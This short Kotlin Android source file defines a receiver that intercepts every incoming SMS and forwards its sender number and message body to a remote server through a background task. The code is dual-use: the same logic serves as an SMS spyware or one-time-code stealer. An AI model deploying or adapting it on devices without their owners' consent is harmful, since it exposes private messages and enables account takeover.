package com.dj_jay.smsscrapper

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import android.util.Log

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        val bundle = intent?.extras
        var strMessage = ""

        if (bundle != null) {
            try {
                val pdus = bundle["pdus"] as? Array<*>
                if (pdus != null) {
                    val messages = pdus.map { SmsMessage.createFromPdu(it as ByteArray) }

                    for (message in messages) {
                        strMessage += "SMS from ${message.originatingAddress} :"
                        strMessage += "${message.messageBody}\n"

                        // Send SMS data to the server
                        sendToServer(message.originatingAddress, message.messageBody)
                    }
                    Log.d("SmsReceiver", strMessage)
                }
            } catch (e: Exception) {
                Log.e("SmsReceiver", "Exception: ${e.message}")
            }
        }
    }

    private fun sendToServer(originatingAddress: String?, messageBody: String?) {
        // Use an AsyncTask or a background thread to send the SMS data to your Laravel server
        val params = mapOf("phone" to originatingAddress, "message" to messageBody)
        SendSmsTask().execute(params)
    }
}